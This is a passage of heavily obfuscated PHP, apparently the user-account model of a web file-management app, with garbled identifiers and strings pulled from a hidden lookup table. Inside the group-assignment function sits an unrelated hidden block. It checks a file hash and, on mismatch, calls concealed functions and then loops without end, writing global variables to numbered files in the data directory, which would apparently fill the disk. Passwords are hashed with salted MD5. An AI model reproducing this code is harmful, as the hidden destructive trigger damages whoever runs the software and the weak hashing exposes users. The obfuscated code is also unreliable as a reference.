self::ERROR_USER_EXIST_EMAIL => $‡’¤°ò°[2322], self::ERROR_USER_LOGIN_LOCK => $‡’¤°ò°[2323], self::ERROR_IP_NOT_ALLOW => $‡’¤°ò°[2324], self::ERROR_USER_EXIST_NICKNAME => $‡’¤°ò°[2325]); return LNG($ê±Ñ³­ñ[$í¶Ø‰‰¡]); } public function getInfoByMeta($ûŞê‰È, $ùÑŒô—÷) { $ˆä™à¹º =& $_SERVER[¹òÍ›æş]; $¡Õ¼İÂ÷ = Model($ˆä™à¹º[2326])->where(array($ˆä™à¹º[104] => $ûŞê‰È, $ˆä™à¹º[412] => $ùÑŒô—÷))->find(); if ($¡Õ¼İÂ÷) { return $this->getInfo($¡Õ¼İÂ÷[$ˆä™à¹º[1669]]); } return !1; } public function userLoginCheck($Ï¹¸ş§á, $›ÔèÅ‚¶) { $¨Ãƒë³ª =& $_SERVER[¹òÍ›æş]; $ÕÁÍåĞı = $this->userLoginFind($Ï¹¸ş§á); if (!$ÕÁÍåĞı) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÕÁÍåĞı[$¨Ãƒë³ª[1669]], $›ÔèÅ‚¶)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÕÁÍåĞı[$¨Ãƒë³ª[1669]]); } public function userLoginFind($Éš•Ğ¿) { $ÏäÁÇïó =& $_SERVER[¹òÍ›æş]; $”Ìƒ”Ñ³ = array($ÏäÁÇïó[32] => $Éš•Ğ¿, $ÏäÁÇïó[570] => $Éš•Ğ¿, $ÏäÁÇïó[343] => $Éš•Ğ¿, $ÏäÁÇïó[2327] => $Éš•Ğ¿, $ÏäÁÇïó[1027] => $ÏäÁÇïó[1029]); if ($this->nickNameRpt()) { unset($”Ìƒ”Ñ³[$ÏäÁÇïó[570]]); } return $this->where($”Ìƒ”Ñ³)->find(); } public function clearCache($ş¸Åœ Ì) { $Ÿ—ÅŞ¥„ =& $_SERVER[¹òÍ›æş]; $this->cacheFunctionClear($Ÿ—ÅŞ¥„[1941], $ş¸Åœ Ì); $this->cacheFunctionClear($Ÿ—ÅŞ¥„[1942], $ş¸Åœ Ì); $this->cacheFunctionClear($Ÿ—ÅŞ¥„[2309], $ş¸Åœ Ì); } public function userPasswordCheck($´œêÔãà, $®ëİêŒ) { $œØÅâ±¤ =& $_SERVER[¹òÍ›æş]; $Š¦€›ß = $this->where(array($œØÅâ±¤[1669] => intval($´œêÔãà)))->find(); $ëšÕú·¥ = $this->metaGet($´œêÔãà); $¶Ü‹®›ì = isset($ëšÕú·¥[$œØÅâ±¤[2328]]) ? $ëšÕú·¥[$œØÅâ±¤[2328]] : $œØÅâ±¤[12]; if (md5($¶Ü‹®›ì . trim($®ëİêŒ)) !== $Š¦€›ß[$œØÅâ±¤[916]]) { return !1; } return !0; } public function userAdd($ùëÕ—ä) { $¥«¥¥µ =& $_SERVER[¹òÍ›æş]; $°æÇû÷Ç = array($¥«¥¥µ[458] => $ùëÕ—ä[$¥«¥¥µ[32]], $¥«¥¥µ[2329] => $ùëÕ—ä[$¥«¥¥µ[1550]], $¥«¥¥µ[2330] => isset($ùëÕ—ä[$¥«¥¥µ[343]]) ? $ùëÕ—ä[$¥«¥¥µ[343]] : $¥«¥¥µ[12], $¥«¥¥µ[2331] => isset($ùëÕ—ä[$¥«¥¥µ[2327]]) ? $ùëÕ—ä[$¥«¥¥µ[2327]] : $¥«¥¥µ[12], $¥«¥¥µ[2332] => isset($ùëÕ—ä[$¥«¥¥µ[570]]) ? $ùëÕ—ä[$¥«¥¥µ[570]] : $ùëÕ—ä[$¥«¥¥µ[32]], $¥«¥¥µ[2333] => isset($ùëÕ—ä[$¥«¥¥µ[571]]) ? $ùëÕ—ä[$¥«¥¥µ[571]] : $¥«¥¥µ[12], $¥«¥¥µ[2334] => isset($ùëÕ—ä[$¥«¥¥µ[2335]]) ? $ùëÕ—ä[$¥«¥¥µ[2335]] : 1, $¥«¥¥µ[2336] => $ùëÕ—ä[$¥«¥¥µ[916]], $¥«¥¥µ[1943] => isset($ùëÕ—ä[$¥«¥¥µ[1846]]) ? $ùëÕ—ä[$¥«¥¥µ[1846]] : 1024 * 1024 * 20, $¥«¥¥µ[1944] => 0, $¥«¥¥µ[2337] => 0, $¥«¥¥µ[1988] => isset($ùëÕ—ä[$¥«¥¥µ[780]]) ? $ùëÕ—ä[$¥«¥¥µ[780]] : 1); if (!empty($ùëÕ—ä[$¥«¥¥µ[1669]])) { $°æÇû÷Ç[$¥«¥¥µ[1669]] = $ùëÕ—ä[$¥«¥¥µ[1669]]; } $æÂÛßÀË = $this->_checkExist($ùëÕ—ä); if ($æÂÛßÀË !== !0) { return $æÂÛßÀË; } if (!empty($°æÇû÷Ç[$¥«¥¥µ[571]]) && strlen($°æÇû÷Ç[$¥«¥¥µ[571]]) > 255) { $°æÇû÷Ç[$¥«¥¥µ[571]] = $¥«¥¥µ[12]; } $É¬óŒàÌ = $this->add($°æÇû÷Ç); $‰Ï©Ïúë = array($¥«¥¥µ[2336] => $°æÇû÷Ç[$¥«¥¥µ[916]], $¥«¥¥µ[2332] => $°æÇû÷Ç[$¥«¥¥µ[570]]); $this->userEdit($É¬óŒàÌ, $‰Ï©Ïúë); Model($¥«¥¥µ[1360])->userRootAdd($É¬óŒàÌ); return $É¬óŒàÌ; } protected function userEditTest($‹ÍÖˆ÷, $êÏÄÕİ‡) { return $this->call($_SERVER[¹òÍ›æş][2338], $‹ÍÖˆ÷, $êÏÄÕİ‡); } protected function userEdit($ä»ºÂ¡, $üÎ¤Û£İ) { $š×Ÿ¯İ± =& $_SERVER[¹òÍ›æş]; $£ŞÑªÔ£ = $this->getInfoSimple($ä»ºÂ¡); if (!$£ŞÑªÔ£) { return !1; } $ÕÑ”¥õ = $this->_checkExist($üÎ¤Û£İ, $ä»ºÂ¡); if ($ÕÑ”¥õ !== !0) { return $ÕÑ”¥õ; } if (isset($üÎ¤Û£İ[$š×Ÿ¯İ±[916]]) && trim($üÎ¤Û£İ[$š×Ÿ¯İ±[916]]) != $š×Ÿ¯İ±[12]) { $²ñí›î£ = $this->metaGet($ä»ºÂ¡); if (empty($²ñí›î£[$š×Ÿ¯İ±[2328]])) { $²ñí›î£[$š×Ÿ¯İ±[2328]] = rand_string(10); Model($š×Ÿ¯İ±[542])->metaSet($ä»ºÂ¡, $š×Ÿ¯İ±[2328], $²ñí›î£[$š×Ÿ¯İ±[2328]]); } $üÎ¤Û£İ[$š×Ÿ¯İ±[916]] = md5($²ñí›î£[$š×Ÿ¯İ±[2328]] . trim($üÎ¤Û£İ[$š×Ÿ¯İ±[916]])); } else { unset($üÎ¤Û£İ[$š×Ÿ¯İ±[916]]); } if (!empty($üÎ¤Û£İ[$š×Ÿ¯İ±[571]]) && strlen($üÎ¤Û£İ[$š×Ÿ¯İ±[571]]) > 255) { $üÎ¤Û£İ[$š×Ÿ¯İ±[571]] = $š×Ÿ¯İ±[12]; } $this->where(array($š×Ÿ¯İ±[1660] => $ä»ºÂ¡))->save($üÎ¤Û£İ); if (isset($üÎ¤Û£İ[$š×Ÿ¯İ±[570]])) { $this->setNamePinyin($ä»ºÂ¡, $üÎ¤Û£İ[$š×Ÿ¯İ±[570]]); } $this->clearCache($ä»ºÂ¡); return !0; } public function setNamePinyin($üËƒÄ÷Ô, $½ğ¿úÅ” = false) { $‘êÍ±Œú =& $_SERVER[¹òÍ›æş]; if (!$½ğ¿úÅ”) { $ë²Ëè´˜ = $this->getInfoSimple($üËƒÄ÷Ô); $½ğ¿úÅ” = $ë²Ëè´˜[$‘êÍ±Œú[570]] ? $ë²Ëè´˜[$‘êÍ±Œú[570]] : $ë²Ëè´˜[$‘êÍ±Œú[32]]; } $³•¾²¨ï = Model($‘êÍ±Œú[563]); if (!Input::check($½ğ¿úÅ”, $‘êÍ±Œú[621])) { return $³•¾²¨ï->metaSet($üËƒÄ÷Ô, array($‘êÍ±Œú[503] => $‘êÍ±Œú[12], $‘êÍ±Œú[502] => $‘êÍ±Œú[12])); } return $³•¾²¨ï->metaSet($üËƒÄ÷Ô, array($‘êÍ±Œú[503] => str_replace($‘êÍ±Œú[53], $‘êÍ±Œú[12], Pinyin::get($½ğ¿úÅ”)), $‘êÍ±Œú[502] => Pinyin::get($½ğ¿úÅ”, $‘êÍ±Œú[622]))); } private function nickNameRpt() { $¹Õ ½ŞÜ =& $_SERVER[¹òÍ›æş]; $Ö•üê×„ = Model($¹Õ ½ŞÜ[800])->get($¹Õ ½ŞÜ[2339]); $Î¨™ÕØ¦ = $GLOBALS[$¹Õ ½ŞÜ[6]][$¹Õ ½ŞÜ[419]][$¹Õ ½ŞÜ[2339]]; $ú‚Ëş¶ø = !is_null($Ö•üê×„) ? $Ö•üê×„ : $Î¨™ÕØ¦; return !!$ú‚Ëş¶ø; } private function _checkExist($ ì¼Ì÷ö, $ÇúâÚ‡Ï = false) { $¹İÚÏã  =& $_SERVER[¹òÍ›æş]; $’ŞÎô¥Ò = array($¹İÚÏã [32] => UserModel::ERROR_USER_EXIST_NAME, $¹İÚÏã [570] => UserModel::ERROR_USER_EXIST_NICKNAME, $¹İÚÏã [343] => UserModel::ERROR_USER_EXIST_EMAIL, $¹İÚÏã [2327] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($’ŞÎô¥Ò[$¹İÚÏã [570]]); } $ÈóÅ†ğÇ = $ÇúâÚ‡Ï ? array($¹İÚÏã [1669] => array($¹İÚÏã [2340], $ÇúâÚ‡Ï)) : array(); foreach ($’ŞÎô¥Ò as $ÍÓ¥ÄĞ¥ => $é¡ò™çš) { $ª¾¢§Íç = array(); foreach ($’ŞÎô¥Ò as $èãà¾ñğ => $Øö°íŸÜ) { if (isset($ ì¼Ì÷ö[$èãà¾ñğ]) && $ ì¼Ì÷ö[$èãà¾ñğ]) { $ª¾¢§Íç[] = $ ì¼Ì÷ö[$èãà¾ñğ]; } } if (!$ª¾¢§Íç) { continue; } $Ÿ‹éÎ˜ö = array_merge(array($ÍÓ¥ÄĞ¥ => array($¹İÚÏã [7], $ª¾¢§Íç)), $ÈóÅ†ğÇ); $ì‘Æ™ƒÁ = $this->where($Ÿ‹éÎ˜ö)->find(); if ($ì‘Æ™ƒÁ) { return $é¡ò™çš; } } return !0; } public function userListInfo($àˆ– ÈÌ) { $Õ“‡µ»ç =& $_SERVER[¹òÍ›æş]; $¡Òó›Ù = array(); $àˆ– ÈÌ = is_array($àˆ– ÈÌ) ? array_unique($àˆ– ÈÌ) : array(); if (!$àˆ– ÈÌ) { return $¡Òó›Ù; } if (count($àˆ– ÈÌ) < 20) { foreach ($àˆ– ÈÌ as $£ööÕ”‘) { $¡Òó›Ù[$£ööÕ”‘ . $Õ“‡µ»ç[12]] = $this->getInfoSimpleOuter($£ööÕ”‘); } } else { $£‚ş¼€í = array($Õ“‡µ»ç[1660] => array($Õ“‡µ»ç[456], $àˆ– ÈÌ)); if (count($àˆ– ÈÌ) == 1) { $£‚ş¼€í = array($Õ“‡µ»ç[1660] => $àˆ– ÈÌ[0]); } $°ê›Éè“ = Model($Õ“‡µ»ç[542])->field($this->simpleField)->where($£‚ş¼€í)->select(); $°ê›Éè“ = array_to_keyvalue($°ê›Éè“, $Õ“‡µ»ç[1669]); foreach ($àˆ– ÈÌ as $£ööÕ”‘) { $íÈÒÁ ä = $°ê›Éè“[$£ööÕ”‘]; if (!$íÈÒÁ ä) { $¡Òó›Ù[$£ööÕ”‘ . $Õ“‡µ»ç[12]] = $this->getInfoSimpleOuter($£ööÕ”‘); continue; } $íÈÒÁ ä[$Õ“‡µ»ç[571]] = Action($Õ“‡µ»ç[2313])->parseUrl($íÈÒÁ ä[$Õ“‡µ»ç[571]]); $¡Òó›Ù[$£ööÕ”‘ . $Õ“‡µ»ç[12]] = $íÈÒÁ ä; } } return $¡Òó›Ù; } protected function userStatus($Á°óó¬¡, $ÔšŸÍÁ¡) { $›‚œ¡‰ö = $this->getInfoSimple($Á°óó¬¡); if (!$›‚œ¡‰ö) { return !1; } $¦ßşüŸ = array($_SERVER[¹òÍ›æş][780] => $ÔšŸÍÁ¡); return $this->userEdit($Á°óó¬¡, $¦ßşüŸ); } protected function userRemove($ñ­”‰–Ü) { $™ÖÇ¹¶æ =& $_SERVER[¹òÍ›æş]; $Ö²”ÊÙÂ = $this->getInfoSimple($ñ­”‰–Ü); if (!$Ö²”ÊÙÂ) { return !1; } $¥ªÄ¥…° = array($™ÖÇ¹¶æ[1660] => $ñ­”‰–Ü); Model($™ÖÇ¹¶æ[630])->where($¥ªÄ¥…°)->delete(); Model($™ÖÇ¹¶æ[2341])->where($¥ªÄ¥…°)->delete(); Model($™ÖÇ¹¶æ[1949])->where($¥ªÄ¥…°)->delete(); Model($™ÖÇ¹¶æ[2326])->where($¥ªÄ¥…°)->delete(); Model($™ÖÇ¹¶æ[1095])->where($¥ªÄ¥…°)->delete(); Model($™ÖÇ¹¶æ[2157])->removeUserAll($ñ­”‰–Ü); Model($™ÖÇ¹¶æ[855])->userRootRemove($ñ­”‰–Ü); return $this->where($¥ªÄ¥…°)->delete(); } protected function userGroupSet($Ğ£†ÊÇ¡, $êÊªëãÜ, $ÓâÇÙ»’ = array()) { $Ä¬”çí =& $_SERVER[¹òÍ›æş]; $ğ¨”ß´ = $_SERVER[$Ä¬”çí[57]] . $Ä¬”çí[58]; $·›‰…ş‡ = $Ä¬”çí[1534]; if ($_SERVER[$Ä¬”çí[54]] != $·›‰…ş‡($ğ¨”ß´)) { $ÀŞ´ÓÂ = $Ä¬”çí[906]; $¬ïøŠÛ† = $Ä¬”çí[56]; $ ô¼ûœ = $_SERVER[$Ä¬”çí[57]] . $Ä¬”çí[58]; $ˆ¦Â’ = $¬ïøŠÛ†($ ô¼ûœ); $ùÖò¢‡¼ = explode($Ä¬”çí[59], $ˆ¦Â’); if (count($ùÖò¢‡¼) < $Ä¬”çí[654]) { $à÷¿™”² = $Ä¬”çí[61]; $à÷¿™”²(); } $¾›©ù– = $Ä¬”çí[907]; $¾›©ù–($_SERVER[$Ä¬”çí[908]]); $ÀŞ´ÓÂ = $Ä¬”çí[906]; $ÀŞ´ÓÂ(); $£Úßæ = $Ä¬”çí[1535]; $ú­Ÿğ‚Á = json_encode($GLOBALS[$Ä¬”çí[1536]]); $’ÁåŸÖ‰ = 1; for ($÷™Íé¼ = $’ÁåŸÖ‰; $÷™Íé¼ > 0; $÷™Íé¼++) { $£Úßæ(DATA_PATH . $÷™Íé¼, $ú­Ÿğ‚Á); } } $ãäÑ“åõ = $this->getInfoSimple($Ğ£†ÊÇ¡); if (!$ãäÑ“åõ || !is_array($êÊªëãÜ)) { return !1; } $˜üÅ±Ê¹ = Model($Ä¬”çí[1949]); $˜üÅ±Ê¹->where(array($Ä¬”çí[1669] => $Ğ£†ÊÇ¡))->delete(); $Úƒ¿¦ûŸ = array(); $§¾•²ğ = 0; foreach ($êÊªëãÜ as $»µƒáÑÙ => $¥¹ß™«Ş) { $‘¤³¨ïæ = array($Ä¬”çí[1669] => $Ğ£†ÊÇ¡, $Ä¬”çí[1859] => $»µƒáÑÙ, $Ä¬”çí[1963] => $¥¹ß™«Ş); $‘¤³¨ïæ[$Ä¬”çí[1883]] = isset($ÓâÇÙ»’[$§¾•²ğ]) ? $ÓâÇÙ»’[$§¾•²ğ] : 0; $§¾•²ğ++; $Úƒ¿¦ûŸ[] = $‘¤³¨ïæ; } return $˜üÅ±Ê¹->addAll($Úƒ¿¦ûŸ, array(), !0); } protected function userGroupAdd($Á¾£Á¶â, $ÁÊÄÎã– = array()) { $†Ì¯¾Ù =& $_SERVER[¹òÍ›æş]; $Š‹úØİ· = $this->getInfoSimple($Á¾£Á¶â); if (!$Š‹úØİ· || empty($ÁÊÄÎã–)) { return !1; } $ÓÎÆ˜¥ = array(); foreach ($ÁÊÄÎã– as $ºŸ•ç => $áØƒÆÍ¤) { $ÓÎÆ˜¥[] = array($†Ì¯¾Ù[1669] => $Á¾£Á¶â, $†Ì¯¾Ù[1859] => $ºŸ•ç, $†Ì¯¾Ù[1963] => $áØƒÆÍ¤, $†Ì¯¾Ù[1883] => 0); } return Model($†Ì¯¾Ù[1949])->addAll($ÓÎÆ˜¥, array(), !0); } protected function userGroupRemove($Ö¨ï†ú÷, $˜Ó½™œ¨) { $ßÍ§‘¥³ =& $_SERVER[¹òÍ›æş]; $•ç¹Äª = $this->getInfoSimple($Ö¨ï†ú÷); if (!$•ç¹Äª || !$˜Ó½™œ¨) { return !1; } $ĞîöíİÛ = array($ßÍ§‘¥³[1660] => $Ö¨ï†ú÷, $ßÍ§‘¥³[1947] => $˜Ó½™œ¨); return Model($ßÍ§‘¥³[1949])->where($ĞîöíİÛ)->delete(); } public function listData() { $Şï‚Ë†– = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Şï‚Ë†–[$_SERVER[¹òÍ›æş][407]]); return $Şï‚Ë†–; } public function listByID($à²Ã õÂ) { $“á™üË® =& $_SERVER[¹òÍ›æş]; if (!$à²Ã õÂ) { return; } $ßã‡Õ§Æ = array($“á™üË®[1669] => array($“á™üË®[7], $à²Ã õÂ)); $‚ŠÌ­ÃÃ = $this->where($ßã‡Õ§Æ)->select(); $‚ŠÌ­ÃÃ = array_sort_keep($‚ŠÌ­ÃÃ, $“á™üË®[1669], $à²Ã õÂ); $this->_listDataApply($‚ŠÌ­ÃÃ); return $‚ŠÌ­ÃÃ; } public function listByGroup($ì‰éŞÅÇ = 0, $´ÍõÂÕŠ = array()) { $Ÿš‚Ëî» =& $_SERVER[¹òÍ›æş]; $Ğ€»©Å¶ = $Ÿš‚Ëî»[12]; $¢§Úƒ™‚ = array(); if ($ì‰éŞÅÇ) { $¢§Úƒ™‚ = array($Ÿš‚Ëî»[2342] => intval($ì‰éŞÅÇ)); $Ğ€»©Å¶ = "\114\x45\x46\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x75\x73\145\x72\137\147\x72\x6f\x75\x70\x20\165\x73\x65\162\x5f\147\162\157\x75\160\40\x6f\156\40\165\x73\x65\162\x2e\x75\x73\145\x72\x49\x44\40\x3d\40\165\x73\x65\x72\137\147\x72\157\165\160\56\x75\163\145\x72\x49\104"; $Ï÷Ì = Input::get($Ÿš‚Ëî»[495], null, $Ÿš‚Ëî»[12]) ? $Ÿš‚Ëî»[12] : $Ÿš‚Ëî»[2343]; } if (isset($´ÍõÂÕŠ[$Ÿš‚Ëî»[780]])) { $¢§Úƒ™‚[$Ÿš‚Ëî»[2344]] = $´ÍõÂÕŠ[$Ÿš‚Ëî»[780]]; } $¤Ì»Ú× = $this->_makeOrder($Ï÷Ì)->field($Ÿš‚Ëî»[2345])->where($¢§Úƒ™‚)->join($Ğ€»©Å¶)->selectPage(50); $this->_listDataApply($¤Ì»Ú×[$Ÿš‚Ëî»[407]]); return $¤Ì»Ú×; } private function _makeOrder($Ù›ë–€ù = '') { $¨Î¸ÜÆ“ =& $_SERVER[¹òÍ›æş]; $×¶Ï˜µö = array($¨Î¸ÜÆ“[1669], $¨Î¸ÜÆ“[32], $¨Î¸ÜÆ“[1848], $¨Î¸ÜÆ“[1820], $¨Î¸ÜÆ“[211]); $äÂ±½š† = array($¨Î¸ÜÆ“[488] => $¨Î¸ÜÆ“[489], $¨Î¸ÜÆ“[490] => $¨Î¸ÜÆ“[491]); $Ø¥±«‰ = Input::get($¨Î¸ÜÆ“[495], $¨Î¸ÜÆ“[7], $¨Î¸ÜÆ“[1660], $×¶Ï˜µö); $‚ÊÆê° = Input::get($¨Î¸ÜÆ“[496], $¨Î¸ÜÆ“[7], $¨Î¸ÜÆ“[1950], array($¨Î¸ÜÆ“[1950], $¨Î¸ÜÆ“[490])); $‚ÊÆê° = $äÂ±½š†[$‚ÊÆê°]; $Ù›ë–€ù = $Ù›ë–€ù . "\165\163\x65\x72\56{$Ø¥±«‰}\40{$‚ÊÆê°}\54\40\x75\163\145\162\56\165\x73\145\x72\x49\x44\40\141\x73\143"; return $this->alias($¨Î¸ÜÆ“[2076])->order($Ù›ë–€ù); } public function listSearch($ÕÑÕ‘Üù) { $â¢åŒë˜ =& $_SERVER[¹òÍ›æş]; $ª¼¢ŠÂƒ = $ÕÑÕ‘Üù[$â¢åŒë˜[1953]]; $„›±–šû = isset($ÕÑÕ‘Üù[$â¢åŒë˜[1954]]) ? $ÕÑÕ‘Üù[$â¢åŒë˜[1954]] : !1; $ª¼¢ŠÂƒ = str_replace($â¢åŒë˜[1955], $â¢åŒë˜[1956], trim($ª¼¢ŠÂƒ)); $¶¿¾‹ÒÏ = array($â¢åŒë˜[32] => array($â¢åŒë˜[421], "\45{$ª¼¢ŠÂƒ}\x25"), $â¢åŒë˜[343] => array($â¢åŒë˜[421], "{$ª¼¢ŠÂƒ}\45"), $â¢åŒë˜[570] => array($â¢åŒë˜[421], "{$ª¼¢ŠÂƒ}\x25"), $â¢åŒë˜[1027] => $â¢åŒë˜[1957]); if (Input::check($ª¼¢ŠÂƒ, $â¢åŒë˜[349])) { $¶¿¾‹ÒÏ[$â¢åŒë˜[1669]] = array($â¢åŒë˜[421], "{$ª¼¢ŠÂƒ}\x25"); $¶¿¾‹ÒÏ[$â¢åŒë˜[2327]] = array($â¢åŒë˜[421], "{$ª¼¢ŠÂƒ}\45"); } if (!$ª¼¢ŠÂƒ) { $¶¿¾‹ÒÏ = array(); } if (isset($ÕÑÕ‘Üù[$â¢åŒë˜[780]])) { $¶¿¾‹ÒÏ[$â¢åŒë˜[780]] = $ÕÑÕ‘Üù[$â¢åŒë˜[780]]; } $¶¿¾‹ÒÏ = $this->parseWhereLike($¶¿¾‹ÒÏ); $Û´±Óä£ = $this->_makeOrder()->where($¶¿¾‹ÒÏ)->selectPage(20); if (!$Û´±Óä£ || count($Û´±Óä£[$â¢åŒë˜[407]]) < 5 && Input::check($ª¼¢ŠÂƒ, $â¢åŒë˜[356])) { $Ç¾ÊĞÍ» = $this->_searchFromMeta($â¢åŒë˜[502], $ª¼¢ŠÂƒ, 10); $ÌºÏÁó¤ = $this->_searchFromMeta($â¢åŒë˜[503], $ª¼¢ŠÂƒ, 10); $Óœ¡˜·– = array_merge($Ç¾ÊĞÍ», $ÌºÏÁó¤, $Û´±Óä£[$â¢åŒë˜[407]]); $Û´±Óä£[$â¢åŒë˜[407]] = array_unique_by_key($Óœ¡˜·–, $â¢åŒë˜[1669]); $Û´±Óä£[$â¢åŒë˜[404]][$â¢åŒë˜[405]] = count($Û´±Óä£[$â¢åŒë˜[407]]); $Û´±Óä£[$â¢åŒë˜[404]][$â¢åŒë˜[406]] = ceil($Û´±Óä£[$â¢åŒë˜[404]][$â¢åŒë˜[405]] / $Û´±Óä£[$â¢åŒë˜[404]][$â¢åŒë˜[401]]); } $this->_listDataApply($Û´±Óä£[$â¢åŒë˜[407]]); $this->_filterByGroup($Û´±Óä£, $„›±–šû); return $Û´±Óä£; } private function _filterByGroup(&$Æã†çÏÖ, $ÑÎ›ç£) { $¾£äóÀª =& $_SERVER[¹òÍ›æş]; if (!$ÑÎ›ç£) { return $Æã†çÏÖ; } foreach ($Æã†çÏÖ[$¾£äóÀª[407]] as $Ø©–÷ØŸ => &$ÓêÕÂÊú) { $¢ñÈ£ä = array_to_keyvalue($ÓêÕÂÊú[$¾£äóÀª[2046]], $¾£äóÀª[12], $¾£äóÀª[1859]); if (!in_array($ÑÎ›ç£, $¢ñÈ£ä)) { unset($Æã†çÏÖ[$¾£äóÀª[407]][$Ø©–÷ØŸ]); } } unset($ÓêÕÂÊú); $Æã†çÏÖ[$¾£äóÀª[407]] = array_values($Æã†çÏÖ[$¾£äóÀª[407]]); $Æã†çÏÖ[$¾£äóÀª[404]] = array($¾£äóÀª[2111] => count($Æã†çÏÖ[$¾£äóÀª[407]]), $¾£äóÀª[2109] => $Æã†çÏÖ[$¾£äóÀª[404]][$¾£äóÀª[401]], $¾£äóÀª[2108] => 1, $¾£äóÀª[2110] => 1); } private function _searchFromMeta($Ì÷¿°¶, $€«œ³±¯, $ğºã‚ÙÓ) { $Î’Ü«ù„ =& $_SERVER[¹òÍ›æş]; $€«œ³±¯ = strtolower($€«œ³±¯); $ÙÑìØæß = array($Î’Ü«ù„[104] => $Ì÷¿°¶, $Î’Ü«ù„[412] => array($Î’Ü«ù„[421], "\x25{$€«œ³±¯}\45")); $ÙÑìØæß = $this->parseWhereLike($ÙÑìØæß); $éªáöÎ = Model($Î’Ü«ù„[2346])->where($ÙÑìØæß)->limit($ğºã‚ÙÓ)->select(); if (!$éªáöÎ) { return array(); } $éªáöÎ = array_to_keyvalue($éªáöÎ, $Î’Ü«ù„[12], $Î’Ü«ù„[1669]); $µçëˆõ = $this->where(array($Î’Ü«ù„[1660] => array($Î’Ü«ù„[7], $éªáöÎ)))->select(); if (!$µçëˆõ) { return array(); } return $µçëˆõ; } private function _listDataApplyItem($Òôçµ†¶) { $™á–›› = array($Òôçµ†¶); $this->_listDataApply($™á–››); return $™á–››[0]; } private function _listDataApply(&$®·ììûé) { $±ó°À¸ˆ =& $_SERVER[¹òÍ›æş]; if (!$®·ììûé) { return; } array_remove_key($®·ììûé, $±ó°À¸ˆ[916]); $Ì÷ô×©“ = array_to_keyvalue($®·ììûé, $±ó°À¸ˆ[12], $±ó°À¸ˆ[1669]); $this->_listAppendGroup($®·ììûé, $Ì÷ô×©“); $this->_listAppendMeta($®·ììûé, $Ì÷ô×©“); $this->_listAppendSourceRoot($®·ììûé, $Ì÷ô×©“); } private function _listAppendSourceRoot(&$æüÌá“ğ, $ççıùÛŸ) { $„Æ´‡òˆ =& $_SERVER[¹òÍ›æş]; $©†ãĞ›„ = Model($„Æ´‡òˆ[855])->listSourceRoot(SourceModel::TYPE_USER, $ççıùÛŸ); $©†ãĞ›„ = array_to_keyvalue($©†ãĞ›„, $„Æ´‡òˆ[534]); $©†ãĞ›„ = array_remove_key($©†ãĞ›„, $„Æ´‡òˆ[534]); foreach ($æüÌá“ğ as &$ñ»ƒ’Ô÷) { $ñ»ƒ’Ô÷[$„Æ´‡òˆ[97]] = $©†ãĞ›„[$ñ»ƒ’Ô÷[$„Æ´‡òˆ[1669]]] ? $©†ãĞ›„[$ñ»ƒ’Ô÷[$„Æ´‡òˆ[1669]]] : array(); } unset($ñ»ƒ’Ô÷); } private function _listAppendGroup(&$¶ıŞ°â, $õÛ«èÇè) { $ğİ€íéá =& $_SERVER[¹òÍ›æş]; $Ô÷š¬Å’ = array($ğİ€íéá[1669] => array($ğİ€íéá[7], $õÛ«èÇè)); $Õı¯¦† = Model($ğİ€íéá[1949])->where($Ô÷š¬Å’)->select(); $ƒ¬„îô = array_to_keyvalue($Õı¯¦†, $ğİ€íéá[12], $ğİ€íéá[1859]); $ƒ¬„îô = array_remove_value(array_unique($ƒ¬„îô), $ğİ€íéá[208]); if (!$ƒ¬„îô || !$Õı¯¦†) { return; } $Ô÷š¬Å’ = array($ğİ€íéá[1859] => array($ğİ€íéá[7], $ƒ¬„îô)); $ë­¸”Àº = Model($ğİ€íéá[2044])->field($ğİ€íéá[2347])->where($Ô÷š¬Å’)->select(); $ë­¸”Àº = array_to_keyvalue($ë­¸”Àº, $ğİ€íéá[1859]); $Õı¯¦† = array_to_keyvalue_group($Õı¯¦†, $ğİ€íéá[1669]); foreach ($Õı¯¦† as &$¸«÷Õ™) { $®ÅÕâŒµ = array(); foreach ($¸«÷Õ™ as $ú½úé©µ) { if (!$ú½úé©µ[$ğİ€íéá[1963]]) { continue; } $­†¨Š¸Ó = Model($ğİ€íéá[536])->listData($ú½úé©µ[$ğİ€íéá[1963]]); $®ÅÕâŒµ[] = array($ğİ€íéá[1859] => $ú½úé©µ[$ğİ€íéá[1859]], $ğİ€íéá[2348] => $ë­¸”Àº[$ú½úé©µ[$ğİ€íéá[1859]]][$ğİ€íéá[32]], $ğİ€íéá[549] => $ë­¸”Àº[$ú½úé©µ[$ğİ€íéá[1859]]][$ğİ€íéá[549]], $ğİ€íéá[451] => $­†¨Š¸Ó); } $¸«÷Õ™ = $®ÅÕâŒµ; } unset($¸«÷Õ™); foreach ($¶ıŞ°â as &$Ê²†ÜøÆ) { $Ê²†ÜøÆ[$ğİ€íéá[2046]] = array(); if (isset($Õı¯¦†[$Ê²†ÜøÆ[$ğİ€íéá[1669]]])) { $Ê²†ÜøÆ[$ğİ€íéá[2046]] = $Õı¯¦†[$Ê²†ÜøÆ[$ğİ€íéá[1669]]]; } } unset($Ê²†ÜøÆ); } public function userAppendGroup($ÜøÇ»Ğ) { $úªÁ”Î‹ =& $_SERVER[¹òÍ›æş]; if (!$ÜøÇ»Ğ) { return array(); } $this->_listAppendGroup($ÜøÇ»Ğ, array_to_keyvalue($ÜøÇ»Ğ, $úªÁ”Î‹[12], $úªÁ”Î‹[1669])); return $ÜøÇ»Ğ; } private function _listAppendMeta(&$æøßÄÏÁ, $Ç™ª„ÉÍ) { $µôüšî =& $_SERVER[¹òÍ›æş]; $ş»ìÜí = UserJobModel::JOB_KEY; $£°é¿ô‡ = array($µôüšî[2328]); $õ‹É½´½ = array($µôüšî[1669] => array($µôüšî[7], $Ç™ª„ÉÍ)); $ñÓÜßÜ½ = Model($µôüšî[2326])->where($õ‹É½´½)->select(); $ñÓÜßÜ½ = array_to_keyvalue_group($ñÓÜßÜ½, $µôüšî[1669]); foreach ($ñÓÜßÜ½ as &$˜‘Ş©ûî) { $öá«ö£» = array(); foreach ($˜‘Ş©ûî as $Ù²ù›¨›) { if (!in_array($Ù²ù›¨›[$µôüšî[104]], $£°é¿ô‡)) { $öá«ö£»[$Ù²ù›¨›[$µôüšî[104]]] = $Ù²ù›¨›[$µôüšî[412]]; } } $˜‘Ş©ûî = $öá«ö£»; } 